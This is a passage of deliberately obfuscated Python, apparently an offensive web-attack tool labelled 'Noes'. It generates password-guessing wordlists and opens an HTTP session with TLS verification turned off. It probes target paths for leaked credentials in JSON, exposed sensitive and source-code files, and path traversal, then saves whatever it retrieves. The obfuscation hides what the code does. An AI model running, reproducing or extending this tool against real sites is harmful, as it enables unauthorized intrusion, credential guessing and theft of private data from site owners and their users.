_0lOOII1IO1OlIllII(b'\xed\x13\xaa\x97\x15\xe0\xefSL\xf4J', b'\xdc\xe2\x03*'), _0lOOII1IO1OlIllII(b'%\x17\xa9\xc2\x01\xfc`a', b'm\xe2f\xc6'), _0lOOII1IO1OlIllII(b'\x1f\x0cXE\xaf\xafQ\xc2\xa2xy', b'\xaf\xd1\xa9\x84'), _11OO0OO1llIlI(b'\\dg\x1d\xde\xf2', b'\xd9\xf4\xc2\xca'), _11OO0OO1llIlI(b'{\x8f\xd5Z\x17\x92\xf1X\xee', b'\x80C\xed\xbd'), _11OO0OO1llIlI(b'J)"^5\xc8O\x94Z$', b'$\xee\x14\xbd'), _11OO0OO1llIlI(b'\xbeZ)\x80^>4\xd4"y\x9dB\xcd', b'\x9d\xefp>'), _0011111Il1O1llOllI(b'{\xcb\xaaX\xe2\xfa', b'\xd4\x8c\x1c\xd6'), _0lOOII1IO1OlIllII(b'\xe05{\x1d\xb4\x0b\x8e\x00?', b'b\xcd\x88\x8f')]
    passwords = []
    for _I0O1lO1l1Il in _1I00II0I1lll:
        passwords.append(_I0O1lO1l1Il)
        passwords.append(_I0O1lO1l1Il.capitalize())
        passwords.append(_I0O1lO1l1Il.upper())
        passwords.append(_I0O1lO1l1Il.lower())
        for _lll110OI1OOIl in [_O01IIlOIlI(b'K', b'\xab*s\xbc'), _0011111Il1O1llOllI(b"'", b'\x04_\x1b)'), _0lOOII1IO1OlIllII(b'\xfc', b'\xcbx\xb3\x1c'), _0lOOII1IO1OlIllII(b'n3z', b'J\x91T\xe4'), _0lOOII1IO1OlIllII(b'\\\xd9\x14n', b'\xf3\xd2\xe8]'), _0011111Il1O1llOllI(b'[\xefDU', b"\xfd$['"), _0lOOII1IO1OlIllII(b'\xd4/\xf6P', b'fH\x1a4'), _11OO0OO1llIlI(b'>\x8c\xad\xd2\x88q', b'\x17\xbb\xac\x97')]:
            passwords.append(_I0O1lO1l1Il + _lll110OI1OOIl)
            passwords.append(_I0O1lO1l1Il.capitalize() + _lll110OI1OOIl)
            passwords.append(_I0O1lO1l1Il + _0011111Il1O1llOllI(b'\xcd', b'\x08f\t\x98') + _lll110OI1OOIl)
            passwords.append(_I0O1lO1l1Il + _11OO0OO1llIlI(b'"', b'\x056\xe9\x0f') + _lll110OI1OOIl)
            passwords.append(_I0O1lO1l1Il + _11OO0OO1llIlI(b'\xd4', b'\xe6\xf4\xe3b') + _lll110OI1OOIl)
            passwords.append(_I0O1lO1l1Il + _O01IIlOIlI(b'\xe8', b'\x86\xdd\x9d\x00') + _lll110OI1OOIl)
            passwords.append(_I0O1lO1l1Il + _0lOOII1IO1OlIllII(b'9', b'\xd3\xae\x9f#') + _lll110OI1OOIl)
        for _OOOOll1lIO01OllOIO in [_O01IIlOIlI(b'R', b'\xe36\xf2\x9a'), _0lOOII1IO1OlIllII(b'\xa0', b'_\x0e\xc9i'), _0lOOII1IO1OlIllII(b'\xa4', b'AxMO'), _O01IIlOIlI(b'\x15', b'i_\xcb\xbc'), _O01IIlOIlI(b'\x84', b']\xfe)\x9d'), _O01IIlOIlI(b'\xfd', b'\x97\x8c\xf5\x81'), _0lOOII1IO1OlIllII(b'\xe0', b't8R\xe7'), _0011111Il1O1llOllI(b'-', b'\x990it')]:
            passwords.append(_I0O1lO1l1Il + _OOOOll1lIO01OllOIO)
            passwords.append(_I0O1lO1l1Il.capitalize() + _OOOOll1lIO01OllOIO)
            passwords.append(_OOOOll1lIO01OllOIO + _I0O1lO1l1Il)
            passwords.append(_OOOOll1lIO01OllOIO + _I0O1lO1l1Il + _0lOOII1IO1OlIllII(b'\xab\xf8\xf3', b'(\x04\xfc\xd1'))
            passwords.append(_I0O1lO1l1Il + _OOOOll1lIO01OllOIO + _11OO0OO1llIlI(b'r\xfe\x15', b'\x9a9,h'))
    _011O1II00I1I = _O01IIlOIlI(b'h\x82IF!\xf2\xaeP\xe4\x1di,\x01q\x98\xce\xdbas\x81-\x12\xb7\x7f\xcas\xba\xf7\xcc\x1d\xc4\xb3\xd1\x8c\xb1\xfaU.\t\x97\xfft\xbd\xe4aJ\x91:(\x8c\xec[\x1eg0\xc0\xd2],`\xcb\xe8\xdf\xa3~!\xe3\xb8\xcb\xe7', b'wQ\xa4\xf3')
    for _ in range(266144091 ^ 266143863):
        _O11l1l000OI0 = _llll10l0O0IOOIlO.randint(1560146173 ^ 1560146171, 223265348 ^ 223265358)
        pwd = _11OO0OO1llIlI(b'', b'"\xcb\xda\x84').join((_llll10l0O0IOOIlO.choice(_011O1II00I1I) for _ in range(_O11l1l000OI0)))
        passwords.append(pwd)
    return list(set(passwords))[:2134241243 ^ 2134239751]
_Il11Ol00OIlO0IlI00 = _01IIIIIIl10I0l0OI0()
_1O0000llII1Il = _OIIlO00OO1I()
_lO1lO1111l = []
_OIl1OOIO11 = _lIOI0O1100Ol1lOIII(int)
_l1lI0001I1OOIIl00 = _11Oll00ll1OII00.Lock()
_1000III00l00OOOII = requests.Session()
_1000III00l00OOOII.headers.update({_O01IIlOIlI(b'\xf3\xe8X\xbfF\xb5\xe2\xad\xad\x14', b'\xf0_\xcd7'): _Ol1I10Il01})
_1000III00l00OOOII.verify = False
_I1O1I10lO01O = False
_ll1l00O1110 = []
_lI00l1llOO = []
_IO0lll0OII0O = []
_110111IIlll11OlI = {_0011111Il1O1llOllI(b'\x9c\xd3\xd8}\x9bD\xab', b't\xc5\xc0\x0c'): 1196347066 ^ 1196347066, _0lOOII1IO1OlIllII(b'l\x8cr6v', b'\xa6\x91\xedc'): 1240325846 ^ 1240325846, _O01IIlOIlI(b'xH\x9d86', b'J\xd3\x9f\xab'): 140033037 ^ 140033037}

def _IOI000O000():
    _IlIIOI11I1.system(_O01IIlOIlI(b'\xe7\xf1S', b'\x1dp\xee\xc6') if _IlIIOI11I1.name == _11OO0OO1llIlI(b'%T', b'F\xe2B!') else _0lOOII1IO1OlIllII(b':*h\xa7\x96', b'\xb8\x87\xca\x86'))

def _101IOI1O0O1I1():
    for d in [_Ol1Ol0lI100l011100, _I00000I0lI1]:
        if not _IlIIOI11I1.path.exists(d):
            _IlIIOI11I1.makedirs(d)

def _1O0I11II1OIOIOl():
    return _l0O0O000O1O1I.now().strftime(_O01IIlOIlI(b'K\x8f}\xb7\x1a\x11\x11\xb4', b'\xec\xb2\xc2\xb8'))

def _IO1111llIOOO11l():
    return _l0O0O000O1O1I.now().strftime(_11OO0OO1llIlI(b'\x9f^\x82\x02\xb3\xd8v$m\xb7\x13nC\xe3\xd9\xe8&', b'x\xfb,J'))

def _lIlOI1IOl00III11II(msg, level=_0011111Il1O1llOllI(b'X\xb0\xebl', b'v\xd8~\xec')):
    timestamp = _1O0I11II1OIOIOl()
    _l00110IOl0IOO0 = {_0011111Il1O1llOllI(b'\xe1\x1fwF\xe9', b'\x96\xb0~\xa7'): _Olll0O10Il0O1010I.GREEN + _lI1OOIlI1O0l0.BRIGHT, _O01IIlOIlI(b'+\xa6\x17\x0f\xa2\x92`[', b'm\x88\x12w'): _Olll0O10Il0O1010I.RED + _lI1OOIlI1O0l0.BRIGHT, _0011111Il1O1llOllI(b'\xdfT\x0c?p', b'\x83$\xda\x04'): _Olll0O10Il0O1010I.RED, _11OO0OO1llIlI(b'\x1f\xb5\xba\xcb\xe9\xf2#', b'\x01\x9c\x1f\xc8'): _Olll0O10Il0O1010I.YELLOW, _11OO0OO1llIlI(b'\x93\xc4\xf5\x99\xd1p\xdd', b'/\xf6\xb9\x17'): _Olll0O10Il0O1010I.GREEN, _11OO0OO1llIlI(b'\xc6\xc5\xe0\xc9', b'\xa9lDp'): _Olll0O10Il0O1010I.CYAN, _0011111Il1O1llOllI(b'\xbeJ\xce\xd2\xdc', b'\xe3\x81\x14z'): _Olll0O10Il0O1010I.MAGENTA, _O01IIlOIlI(b'\tm\x18\x1fN\xdd', b'\x8eP\xe1x'): _Olll0O10Il0O1010I.BLUE + _lI1OOIlI1O0l0.BRIGHT, _0011111Il1O1llOllI(b'~@\xfe\xe1WsLH', b'\xf2X\x06E'): _Olll0O10Il0O1010I.LIGHTCYAN + _lI1OOIlI1O0l0.BRIGHT, _0011111Il1O1llOllI(b'4Im\xa8g', b'\x19\x8e.\xbc'): _Olll0O10Il0O1010I.LIGHTMAGENTA + _lI1OOIlI1O0l0.BRIGHT, _11OO0OO1llIlI(b'\xef\xa0\xae\x8c', b'\x90^\x8c\xb3'): _Olll0O10Il0O1010I.LIGHTYELLOW, _O01IIlOIlI(b'\xeb\xb4\x88\x9b', b'G\xe6\xcf^'): _Olll0O10Il0O1010I.RED + _lI1OOIlI1O0l0.BRIGHT, _O01IIlOIlI(b'xM\x1b\x87\xb6\xe4\xa2\x05\x08\x11`B\x81', b'*\xba\xf2R'): _Olll0O10Il0O1010I.GREEN + _lI1OOIlI1O0l0.BRIGHT + _OII1I1011Ol010lI.MAGENTA}
    color = _l00110IOl0IOO0.get(level, _Olll0O10Il0O1010I.WHITE)
    full = f'[{timestamp}] {color}{msg}{_lI1OOIlI1O0l0.RESET_ALL}'
    print(full)
    with _l1lI0001I1OOIIl00:
        with open(_l0l0I0lI1I, _O01IIlOIlI(b'|', b'\xfe\xb6z_'), encoding=_11OO0OO1llIlI(b'\xb3\x14\xd0 \x9c', b'\x9a>\x0f\x16'), errors=_0lOOII1IO1OlIllII(b'\x1c\xf8<\xcc\x91^', b'I\x9f\x1d\xd5')) as _I0lIIOlOl1011l:
            _I0lIIOlOl1011l.write(f'[{timestamp}] {msg}\n')

def _OOl0l1llO110():
    with _l1lI0001I1OOIIl00:
        with open(_OO0lO0O00lI1OOI1I1, _O01IIlOIlI(b'^', b'h\xb0\xb8\x12'), encoding=_0lOOII1IO1OlIllII(b'\xdb\x037\x8f\xd3', b'\xcc\xca\x99\xaa')) as _0OO00O11I1l:
            json.dump({_11OO0OO1llIlI(b'\x9f6F\xee\x1b+\x8f\xf12', b'\x1f,iy'): _IO1111llIOOO11l(), _0011111Il1O1llOllI(b'CX$\xf0\xcc\xc8r\x07', b'\x99X\x90\x08'): _l01Il0Ol1lO10, _0011111Il1O1llOllI(b'a\x98\x95\x1eC\xdc\xe6', b'b\xd0\x05\xc7'): _I0lOll0000O, _0011111Il1O1llOllI(b'\xe5\x1c\xd7J\x8e\xa8R0z', b'\xfc\x14\xdfz'): _O10I011l0O1I11IIl, _0lOOII1IO1OlIllII(b'\xbcB.{)4)\x98\x98]\xfc', b'8\x7f\xf4\x02'): len(_lO1lO1111l), _11OO0OO1llIlI(b'\xc1\x0cIW\x19\x13-', b'\xb3\xba\xe2,'): _lO1lO1111l, _11OO0OO1llIlI(b'\xf2\xcdl\xcdu', b'4\xc6\xca\xf6'): dict(_OIl1OOIO11), _0lOOII1IO1OlIllII(b't\x86nw?d\xae\xb6\x06(e\x029\xe4g\xf8', b'[\xf4\xa6\x7f'): _ll1l00O1110, _11OO0OO1llIlI(b'm;M\xf2\xe3\xcb\xed>n.d1', b'\x92u\xe8\x10'): _lI00l1llOO, _0011111Il1O1llOllI(b'"i0\xf2\x9dd\xecrt\xcbw', b'`7\xe7j'): _IO0lll0OII0O}, _0OO00O11I1l, indent=648987668 ^ 648987670)
    _lIlOI1IOl00III11II(f'Data saved to {_OO0lO0O00lI1OOI1I1}', _0011111Il1O1llOllI(b'\xba\x9a\xad e\x11M', b'\xb4\xb8\x95\x91'))

def _00OOOllI1OOIIl0():
    global _lO1lO1111l, _ll1l00O1110, _lI00l1llOO, _IO0lll0OII0O
    if _IlIIOI11I1.path.exists(_OO0lO0O00lI1OOI1I1):
        try:
            with open(_OO0lO0O00lI1OOI1I1, _O01IIlOIlI(b'\xae', b'\xa8\xc5\xda\xf6')) as _O1OIIIO101I:
                data = json.load(_O1OIIIO101I)
                _lO1lO1111l = data.get(_0011111Il1O1llOllI(b'\xe5%\xc1\xd0j?\xa6', b'\xe4I\xf8\x05'), [])
                _ll1l00O1110 = data.get(_0011111Il1O1llOllI(b'\x93\xcb\x80\x01\xe6)\x17\xda\x0f,l\xe1s\xbdK\xa6', b'\xd8\xae\xde\x8b'), [])
                _lI00l1llOO = data.get(_0011111Il1O1llOllI(b'r\xd7\x8bE)M$Z\x0f\x14\xf7{', b'\x86\x9d\t7'), [])
                _IO0lll0OII0O = data.get(_0011111Il1O1llOllI(b'8)\xa2\xc1C@D\xe5\x8a\xf8\x83', b'\x81\x85\x7f\xbd'), [])
                return data
        except:
            pass
    return None

def _OllO00Il1OlOOl1O(url, content, file_type=_11OO0OO1llIlI(b'3\x87.\x04\xa9\x02', b'oP\xdb\xd1')):
    try:
        filename = url.split(_0011111Il1O1llOllI(b'\xa9', b'\x81\xf3RP'))[-(1281623240 ^ 1281623241)] or _0011111Il1O1llOllI(b'^\x12\xa7;o\xe7\xaf\xac4\x8f', b'\xde\x99:+')
        if not filename or _0011111Il1O1llOllI(b'J', b'{\x91\xf8a') not in filename:
            filename = f'{_0l1OOIlOIIIlII110l.md5(url.encode()).hexdigest()[:10]}.txt'
        filename = _1OlIl11II01Il0I1OO.sub(_11OO0OO1llIlI(b'\xaf\xd0_gq\xa6\x9b\xc7\xb5', b'\x17\r\xe3\x12'), _11OO0OO1llIlI(b'{', b'O\xd0\x83\x18'), filename)
        _O1O0lII0lIIO = _l0O0O000O1O1I.now().strftime(_0011111Il1O1llOllI(b'\x06\xff\x8f\x80\x91Q', b'].\xc9\xc2'))
        _101I1OOO10O1l = _IlIIOI11I1.path.join(_I00000I0lI1, _O1O0lII0lIIO)
        if not _IlIIOI11I1.path.exists(_101I1OOO10O1l):
            _IlIIOI11I1.makedirs(_101I1OOO10O1l)
        _00111O01I0I0IlI = _IlIIOI11I1.path.join(_101I1OOO10O1l, filename)
        if _IlIIOI11I1.path.exists(_00111O01I0I0IlI):
            _0I1l0Ol01I1Il, _I1O0lIl1lO = _IlIIOI11I1.path.splitext(filename)
            _00111O01I0I0IlI = _IlIIOI11I1.path.join(_101I1OOO10O1l, f'{_0I1l0Ol01I1Il}_{int(time.time())}{_I1O0lIl1lO}')
        with open(_00111O01I0I0IlI, _11OO0OO1llIlI(b'\x7f', b'\x9d> \xc2'), encoding=_0011111Il1O1llOllI(b'\x99\xbf\xd9M\xa6', b'uL\x0f\xab'), errors=_0011111Il1O1llOllI(b'\xed\xb4\xbb$s\xe1', b'\xa3\xbd\xfe|')) as _00O0IO1IIIl:
            _00O0IO1IIIl.write(f'URL: {url}\n')
            _00O0IO1IIIl.write(f'Type: {file_type}\n')
            _00O0IO1IIIl.write(f'Fetched: {_IO1111llIOOO11l()}\n')
            _00O0IO1IIIl.write(_11OO0OO1llIlI(b'\xde', b'\x0fl\xe9\xc3') * (2115196529 ^ 2115196493) + _0lOOII1IO1OlIllII(b'*u', b'F\x9a\xf9\n'))
            _00O0IO1IIIl.write(content)
        _lIlOI1IOl00III11II(f'SOURCE SAVED: {_00111O01I0I0IlI}', _0011111Il1O1llOllI(b']\x16\xf1Uz\x87\xa4^', b'\xabz\xf4\xc6'))
        return _00111O01I0I0IlI
    except Exception as e:
        _lIlOI1IOl00III11II(f'Error saving source: {e}', _11OO0OO1llIlI(b'\xd5I\xa0\x0f\xcb', b'WR[\x99'))
        return None

def _IlOOIII1lI(url):
    try:
        r = _1000III00l00OOOII.get(url, timeout=_01lOO110l0O00lOOl, verify=False)
        if r.status_code == 1698758127 ^ 1698757927:
            content = r.text
            _00IIOl00OIl = _OllO00Il1OlOOl1O(url, content)
            _lIlOI1IOl00III11II(f'SOURCE GRABBED: {url} -> {_00IIOl00OIl}', _0lOOII1IO1OlIllII(b'M\x87\x14\xcf\x85\xd2', b'\xc8z\x8d)'))
            return content
        else:
            _lIlOI1IOl00III11II(f'Failed to fetch: {url} - Status {r.status_code}', _0011111Il1O1llOllI(b'Zo\x9a\xbdl', b'&J\x143'))
            return None
    except Exception as e:
        _lIlOI1IOl00III11II(f'Error: {url} - {str(e)[:80]}', _O01IIlOIlI(b'\x81\xf3\x06\xd7\xfa', b'\x01\xa81\x06'))
        return None

def _IOI01O0l10l0(url, filename=None):
    try:
        if not filename:
            filename = url.split(_0lOOII1IO1OlIllII(b'\x87', b'\xd9\t\xbd\x96'))[-(189521544 ^ 189521545)] or _0011111Il1O1llOllI(b'~\xc4\xff\xa5\x88r\xe0A\xf6B', b'\x94\xcd\xf9\xdb')
            if not filename or _0lOOII1IO1OlIllII(b'\xa2', b'\xed\xe9\x10\xbf') not in filename:
                filename = f'file_{_0l1OOIlOIIIlII110l.md5(url.encode()).hexdigest()[:8]}.html'
        filename = _1OlIl11II01Il0I1OO.sub(_11OO0OO1llIlI(b'q+z\xc3I\n#r^', b'gU\x1an'), _O01IIlOIlI(b'\r', b's\x91t\x0c'), filename)
        _lOI1O0llIOIl0I0 = _l0O0O000O1O1I.now().strftime(_11OO0OO1llIlI(b'u\xba\x03\xcc\xf8E', b'\xc6<\xcb_'))
        _l1II01l000II = _IlIIOI11I1.path.join(_I00000I0lI1, _lOI1O0llIOIl0I0)
        if not _IlIIOI11I1.path.exists(_l1II01l000II):
            _IlIIOI11I1.makedirs(_l1II01l000II)
        _1IlOIlll1IO = _IlIIOI11I1.path.join(_l1II01l000II, filename)
        if _IlIIOI11I1.path.exists(_1IlOIlll1IO):
            _1I011lIO0I0, _l00O1O0l10 = _IlIIOI11I1.path.splitext(filename)
            _1IlOIlll1IO = _IlIIOI11I1.path.join(_l1II01l000II, f'{_1I011lIO0I0}_{int(time.time())}{_l00O1O0l10}')
        r = _1000III00l00OOOII.get(url, timeout=_01lOO110l0O00lOOl, verify=False)
        if r.status_code == 356708303 ^ 356708103:
            with open(_1IlOIlll1IO, _11OO0OO1llIlI(b'\x89\xe6', b'\x00\x11\tU')) as _IllIOO1II0:
                _IllIOO1II0.write(r.content)
            _0llIOI101000OO1OO = {_11OO0OO1llIlI(b'9\xcda', b'\x80\x91\xd0\xb6'): url, _0011111Il1O1llOllI(b'\xe1\xa7\x14\xfe\x82\x81\xd1s', b'3\\P\xd0'): _IlIIOI11I1.path.basename(_1IlOIlll1IO), _11OO0OO1llIlI(b'\x97g\xecv', b'\x0e\x90M\xfc'): _1IlOIlll1IO, _0lOOII1IO1OlIllII(b'\xc1\x8b\xf1\x9c', b'E9[\xcb'): len(r.content), _0lOOII1IO1OlIllII(b'\x04lD\xfd', b'\xee\x0e\x1d-'): r.headers.get(_0lOOII1IO1OlIllII(b'j\xcc\xc9 N\t\xed\xef7)[\xdc', b'\x07\xbe\x1f\x83'), _0lOOII1IO1OlIllII(b'_\xd3\xdd\x97D\x17\xb8', b'@UQ\x80')), _0lOOII1IO1OlIllII(b"\xc47\xe4\xf5\x97'\xe7\x0e\xf1", b'L\xaa-\xf2'): _IO1111llIOOO11l(), _0011111Il1O1llOllI(b"\x96\xba'", b'\xec\x1d\xe9x'): _0l1OOIlOIIIlII110l.md5(r.content).hexdigest()}
            with _l1lI0001I1OOIIl00:
                _ll1l00O1110.append(_0llIOI101000OO1OO)
            _lIlOI1IOl00III11II(f'DOWNLOADED: {_IlIIOI11I1.path.basename(_1IlOIlll1IO)} ({len(r.content)} bytes)', _0011111Il1O1llOllI(b'\xf5c\xe6\xb1>m[\x0c', b'M\x88o\xa0'))
            _OOl0l1llO110()
            return _0llIOI101000OO1OO
        else:
            _lIlOI1IOl00III11II(f'Download failed: {filename} - Status {r.status_code}', _0lOOII1IO1OlIllII(b'\xdc\x17&D\x95', b'\x1b\x1c.\xb3'))
            return None
    except Exception as e:
        _lIlOI1IOl00III11II(f'Error downloading: {e}', _11OO0OO1llIlI(b'E>\x86j\xbb', b'v\x9f)\x86'))
        return None

def _OIll00lO000OOlI1OI(base_url, path):
    try:
        target = _0IOI01O1I1l0(base_url, path)
        _Ol1OII10Il1I0l1OI = _l1lII10OOO0O(target)
        if not _Ol1OII10Il1I0l1OI.netloc:
            return None
        r = _1000III00l00OOOII.get(target, timeout=_01lOO110l0O00lOOl, allow_redirects=False, verify=False)
        status = r.status_code
        size = len(r.content)
        content_type = r.headers.get(_11OO0OO1llIlI(b'|\xe3:\x8a\xe9\x94\x9a\x90\t\xe8\x88q', b'\xd1\r\x02\x9f'), _11OO0OO1llIlI(b'', b'Te\xf1\xb8')).lower()
        _1O11IOlI0l0I0IOI = False
        vuln_type = _0lOOII1IO1OlIllII(b'', b'.hI\xbc')
        severity = _O01IIlOIlI(b'MS\x03', b'\xb6Nr&')
        if _11OO0OO1llIlI(b'_\xe7\xc7\xc3', b'\x9d\xc5\x16h') in content_type or path.endswith(_11OO0OO1llIlI(b'\xa4K\x8ey3', b'\xbb\xbf\xc7\x12')):
            try:
                _l0I00lOl0l0OO = r.json()
                _1l1ll10I1Illl1O = json.dumps(_l0I00lOl0l0OO, indent=1042253542 ^ 1042253540)
                sensitive = [_0011111Il1O1llOllI(b'\xe9\xd7\xbc\xff\xecX\x9b\xcb', b')\x8e\xc2)'), _O01IIlOIlI(b'\xd4Jit\xdb\xb1D', b'\xa9\xad\xd3s'), _0011111Il1O1llOllI(b's\n\x03\x16h', b'\xd0\xb9\x0c\x1c'), _0lOOII1IO1OlIllII(b'V\xb9 \xfeP3', b'\\z\xad\x9a'), _O01IIlOIlI(b"'h\x1d\xcd", b'\xe3\xe1\xa5\xd5'), _O01IIlOIlI(b'\x87\xbb\x16\x16\x19', b'\xaa#Pk'), _0011111Il1O1llOllI(b'}9\xf0C\xde', b'>\xf2\xf9*'), _0011111Il1O1llOllI(b'\xa0\xdd\xdc\x86', b'\xadGG\xa3'), _11OO0OO1llIlI(b"\xb4\x81'", b'\xf9[\x97*'), _0lOOII1IO1OlIllII(b'G$\xd3\x88', b'\xb4\x08}L'), _0011111Il1O1llOllI(b'\xc29\xc1', b'(\xc6\x7f~'), _0011111Il1O1llOllI(b'\x12t\xac\xb2xb\x0fF-\x13\x0e', b'\x8b\xfa\x1bA'), _0011111Il1O1llOllI(b'\x82\x89\xd75AT\xa0$', b'6\xaf,\xf3'), _O01IIlOIlI(b'\x95\xdd', b'6\r\x858'), _0lOOII1IO1OlIllII(b'B\xbf\x0b\xde', b';R\xe4\x16'), _0lOOII1IO1OlIllII(b'\xe8;:\x00', b'PU%-'), _0011111Il1O1llOllI(b'\xe8\xab\xdag:\xca>\xac', b'\xeb\xd6?s'), _O01IIlOIlI(b'\xf0\xb6t\xe9\xa1', b'9\x97\x17\xda'), _0011111Il1O1llOllI(b'\xc3\xff\xe5\xff\xa4\xb1', b'\xaej-r'), _0011111Il1O1llOllI(b'3\xef\xa6', b'\x1eV"\xf0'), _11OO0OO1llIlI(b'\xcd\x99sK\xc8\xc3\\', b'\xde3\x1b\xfc')]
                found = [k for k in sensitive if k in _1l1ll10I1Illl1O.lower()]
                if found:
                    _1O11IOlI0l0I0IOI = True
                    vuln_type = _O01IIlOIlI(b'\xab^\xa9=\xf7\xc1\x9a\xb8\xee', b'\xbe\xa7\xb5\x08')
                    severity = _O01IIlOIlI(b'>\xc4\x98\x90I\x1f\x1f\xe4', b'\xc5\xf2\x1f(')
                    _OllO00Il1OlOOl1O(target, _1l1ll10I1Illl1O, _11OO0OO1llIlI(b'\x16\xb9\x17\xfbHy!h(', b'|\x87\xe9Z'))
                    _lIlOI1IOl00III11II(f'[Noes] JSON LEAK FOUND: {target}', _O01IIlOIlI(b'}\xf6\xc4\x9e', b'\xe2\xdc\x9d\x9b'))
            except:
                if size > 269746336 ^ 269746336 and _0lOOII1IO1OlIllII(b'\xc9', b'`\xa6!\x1f') in r.text:
                    _1O11IOlI0l0I0IOI = True
                    vuln_type = _O01IIlOIlI(b'\xe1\x04\x87\x91\xfe1jm\x1d\xe2\x1b\xf3', b'/\x9e\xc3\x00')
                    severity = _11OO0OO1llIlI(b'\xac\xa3K\xc7', b'T\xa8#\xaf')
                    _OllO00Il1OlOOl1O(target, r.text[:266179255 ^ 266174783], _0011111Il1O1llOllI(b"\xf5\xa8\xf5t'\xf8\xb0,\rO\xb2\xa2", b'\x98pg\x89'))
        _1110lOl0lll00 = [_O01IIlOIlI(b'\xf2\xccZd', b'F\x9e\x1e\xe9'), _O01IIlOIlI(b'P\xceB\x9e', b'q&\xa9\xb9'), _O01IIlOIlI(b'\xe6Q\xba\xfc', b'\xb3t\x88?'), _O01IIlOIlI(b'\xf0z\x96\xac', b'T.\x04\x99'), _0lOOII1IO1OlIllII(b'\xaf$m\xb2M\xb6\x9a\xd28', b'\x0f\xeb\x18b'), _11OO0OO1llIlI(b'\xe7D\xa3\x01\xb8\x9a\x18\x97j', b'\x83\x1bSS'), _0011111Il1O1llOllI(b'P\xf7\xd3\x84', b'\xfa\xaf\xa3\x0c'), _0011111Il1O1llOllI(b'>\xeb[1', b'\x92\xf4\xad\xc5'), _0011111Il1O1llOllI(b'\n,\xb9}', b'\xe3\xb8?\x86'), _0011111Il1O1llOllI(b'1\xfbJ\x92', b'\xda\x14\xabS'), _11OO0OO1llIlI(b'3\x9f\x90l#', b'\xc6u\xb4\xe8'), _0lOOII1IO1OlIllII(b'\xe3s\x06\x13', b'rLK9'), _0lOOII1IO1OlIllII(b"\x14\xac'\xed", b'\t\xd0!#'), _0011111Il1O1llOllI(b'#\xad\xc1\xd5', b'\x8f\xe5\xfd\x93'), _O01IIlOIlI(b'\xedT\x98\xb8', b'\xcc\x9d!\xcf'), _11OO0OO1llIlI(b'O\xb8v\xee', b']hi\x85'), _0011111Il1O1llOllI(b"')\x16\x0e\xb0R\x93\xb9H", b'L\xb5h\x17'), _0lOOII1IO1OlIllII(b'6\x01\xb6\x1a\xd5', b'm\x9cY\x80')]
        if any((path.endswith(e) for e in _1110lOl0lll00)):
            if status == 1564182662 ^ 1564182606 and size > 550332734 ^ 550332734:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0lOOII1IO1OlIllII(b'v\tp\x99F/U\x8f\x85\x03\xdd\x0b\xf9a', b'\x1d\x18Z\x96')
                severity = _11OO0OO1llIlI(b'\x0c\xf7\t2', b'\xa5X)\xda')
                _OllO00Il1OlOOl1O(target, r.text[:1498440174 ^ 1498442326], _11OO0OO1llIlI(b'_\xc2\xf3\xc1u\xa2\xfe\xfd\xbb', b'6k\x9c\xda'))
                _lIlOI1IOl00III11II(f'[Noes] SENSITIVE FILE: {target}', _0011111Il1O1llOllI(b'O\xee\xf6r', b'q\x82i\xd9'))
        _0I0100O1O1Il0II0 = [_11OO0OO1llIlI(b'\xf6\xa6>\x9c', b'\xe4h9\xf2'), _0011111Il1O1llOllI(b'\xa6$\x17\xc0\xfc', b'\xce\xba\xd5\x08'), _0011111Il1O1llOllI(b'\x14\xddO\xed', b'\x89[\xdf4'), _0011111Il1O1llOllI(b'\xbbm\x1f', b'G8\x1c\xaa'), _0lOOII1IO1OlIllII(b'\xd5@*', b's\xd3}\xb2'), _O01IIlOIlI(b'Z\xad2\xf4', b'\xd4\x8e\xc2\x8f'), _0lOOII1IO1OlIllII(b'"\xddv\xe5\x8c', b'\xb9\x1b\xf8\xd8'), _11OO0OO1llIlI(b'\\\xbc\x1a5', b'\x1f>c\x19'), _0lOOII1IO1OlIllII(b'\x80\xc1Z', b'\xf9\xf1\x949'), _0lOOII1IO1OlIllII(b'\xcc\xd7\x94{', b'\xcc\x1c\x14;'), _11OO0OO1llIlI(b'\x0c\x1f$\xef', b'\x06\xb4\xf2\x03'), _11OO0OO1llIlI(b'\xe9y\x0f\xc3', b"\xa0\xe1;'"), _O01IIlOIlI(b'\x07*\xaf', b'\x83\x1c\xbd?'), _O01IIlOIlI(b'\xaf=\xf6', b')\xe4E\xce'), _0011111Il1O1llOllI(b'8CD', b'.\xd1O\x99'), _0lOOII1IO1OlIllII(b'\x1a6\x9a', b'\xb4-\xcf\xaa'), _0lOOII1IO1OlIllII(b'\x9a@^\x14\xbc', b'GfS6'), _11OO0OO1llIlI(b'\x1cp\x16\xd9', b'\xe8\r\x04d'), _0011111Il1O1llOllI(b'\xef\xdb\xd1/', b'\x9cB\x94='), _0011111Il1O1llOllI(b'\xad<\xf8N', b'VFnO'), _O01IIlOIlI(b'1V\x85g', b'z_[Q')]
        if any((path.endswith(e) for e in _0I0100O1O1Il0II0)):
            if status == 2119871486 ^ 2119871286 and size > 1257153387 ^ 1257153387:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0lOOII1IO1OlIllII(b'\x95\x9b"\xdb\xfe\x08\xc94!U\xd3', b'\xdaf]R')
                severity = _O01IIlOIlI(b'}dv\xef\xb1\x84', b'\x87B\xd5*')
                _OllO00Il1OlOOl1O(target, r.text[:1879958493 ^ 1879959653], _0lOOII1IO1OlIllII(b"t\n'\xc9\xf1\xb3\xa7\xa5Z\xdf\xf6", b'\x04V"^'))
                _lIlOI1IOl00III11II(f'[Noes] SOURCE CODE: {target}', _0011111Il1O1llOllI(b'\x8b\x08r\xd9', b'P\x92zI'))
        if _O01IIlOIlI(b'\xef}\x86', b'\xc0\x99&\x93') in path or _11OO0OO1llIlI(b'\xd8D\\', b'\x14\xe8\x1dr') in path:
            if status == 1055269113 ^ 1055268913 and size > 867709890 ^ 867709890:
                _1O11IOlI0l0I0IOI = True
                vuln_type = _0011111Il1O1llOllI(b'\xeaU\xe9\x08?\xd72=\xb0\x10\x9e\xd9\xaf\xb7[Z\xdfHa', b'\xf2\x80<\xa7')
                severity = _0lOOII1IO1OlIllII(b'N.a\x82\xcd\xac\xe8<', b'B\xdd\x92n')
                _OllO00Il1OlOOl1O(target, r.text[:1015843535 ^ 1015844127], _O01IIlOIlI(b'\xe3(;\x0eq\x1d\xc1w\xd7', b'u\xa6\xd3d'))
                _lIlOI1IOl00III11II(f'[Noes] TRAVERSAL: {target}', _0011111Il1O1llOllI(b'-\xa0\xed\\', b'\xf2\xad\xb0\x90'))
